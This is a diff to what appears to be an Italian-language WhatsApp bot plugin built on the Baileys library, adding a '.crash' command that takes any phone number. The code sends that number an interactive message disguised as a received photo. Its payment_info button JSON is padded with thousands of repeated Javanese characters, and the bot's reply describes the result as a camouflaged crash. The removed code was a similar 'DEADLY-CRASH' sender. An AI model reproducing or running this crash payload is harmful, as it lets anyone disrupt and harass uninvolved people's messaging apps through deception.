@@ -1,66 +1,45 @@
-import { createCanvas } from 'canvas'
-import { generateWAMessageFromContent } from '@realvare/baileys'
+let handler = async (m, { conn, args }) => {
+  if (!args[0]) return m.reply('⚠️ Inserisci un numero.\nEsempio: `.crash numero`')
+  let numi = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net'
 
-let handler = async (m, { conn, text, command }) => {
-  if (!text) return m.reply(`📌 Usa così:\n.${command} numero\n\nEsempio:\n.${command} 393471234567`)
-
-  let target = `${text.replace(/[^0-9]/g, '')}@s.whatsapp.net`
-
-  try {
-    // Genera l'immagine
-    const width = 800
-    const height = 600
-    const canvas = createCanvas(width, height)
-    const ctx = canvas.getContext('2d')
-
-    ctx.fillStyle = '#000'
-    ctx.fillRect(0, 0, width, height)
-
-    ctx.fillStyle = '#ff0000'
-    ctx.font = 'bold 60px Arial'
-    ctx.textAlign = 'center'
-    ctx.fillText('𝐃𝐄𝐀𝐃𝐋𝐘 𝐃𝐎𝐌𝐈𝐍𝐀', width / 2, height / 2)
-
-    const buffer = canvas.toBuffer()
-
-    // Metodo alternativo: Invio diretto tramite le funzioni integrate del framework
-    // per garantire che l'upload multimediale sia gestito nativamente dal bot
-    let msg = await generateWAMessageFromContent(target, {
-      viewOnceMessage: {
-        message: {
-          interactiveMessage: {
-            header: {
-              hasMediaAttachment: false, // Disabilitato l'upload manuale non supportato
-              title: "𝐃𝐄𝐀𝐃𝐋𝐘"
-            },
-            body: {
-              text: "𝐃𝐄𝐀𝐃𝐋𝐘-𝐂𝐑𝐀𝐒𝐇"
-            },
-            nativeFlowMessage: {
-              messageParamsJson: JSON.stringify({}),
-              buttons: [
-                { 
-                  name: "single_select", 
-                  buttonParamsJson: JSON.stringify({ title: "Menu", sections: [{ title: "Opzioni", rows: [{ title: "Seleziona", rowId: "1" }] }] }) 
-                }
-              ]
-            }
-          }
+  await conn.relayMessage(numi, {
+    interactiveMessage: {
+      header: {
+        title: "📸",
+        hasMediaAttachment: true,
+        imageMessage: {
+          url: "https://telegra.ph/file/2a2b8c2c6e84b2e123abc.jpg", 
+          mimetype: "image/jpeg"
         }
+      },
+      body: {
+        text: "Foto ricevuta 📷"
+      },
+      nativeFlowMessage: {
+        buttons: [
+          {
+            name: "payment_info",
+            buttonParamsJson: "{\"currency\":\"BRL\",\"total_amount\":{\"value\":0,\"offset\":100},\"reference_id\":\"\",\"type\":\"physical-goods\",\"order\":{\"status\":\"pending\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"name\":\"\",\"amount\":{\"value\":0,\"offset\":100},\"quantity\":0,\"sale_amount\":{\"value\":0,\"offset\":100}}]},\"payment_settings\":[{\"type\":\"pix_static_code\",\"pix_static_code\":{\"merchant_name\":\"𝒄𝒓𝒂𝒔𝒉" + "ꦽ".repeat(4000) + "\",\"key\":\"𝒃𝒚.𝛥𝐗𝐈𝚶𝐍 𝚩𝚯𝐓" + "ꦹ".repeat(4000) + "\",\"key_type\":\"EMAIL\"}}],\"share_payment_status\":false,\"referral\":\"chat_attachment\"}"
+          }
+        ]
       }
-    }, { userJid: conn.user?.id || conn.user?.jid })
+    }
+  }, {
+    additionalNodes: [
+      {
+        tag: "biz",
+        attrs: { native_flow_name: "payment_info" }
+      }
+    ],
+    participant: { jid: numi },
+    userJid: numi
+  })
 
-    await conn.relayMessage(target, msg.message, { messageId: msg.key?.id })
-
-    // Invia l'immagine separatamente come conferma utilizzando la funzione nativa del bot
-    await conn.sendMessage(target, { image: buffer, caption: "Immagine associata" })
-
-    m.reply(`✅ Messaggio strutturato inviato a ${text}`)
-  } catch (e) {
-    console.error(e)
-    m.reply("❌ Errore durante l'invio: " + e.message)
-  }
+  m.reply(`✅ Crash camuffato inviato a ${args[0]}`)
 }
 
-handler.command = /^delay$/i
+handler.command = /^crash$/i
+handler.help = ['crash <numero>']
+handler.tags = ['fun']
+
 export default handler
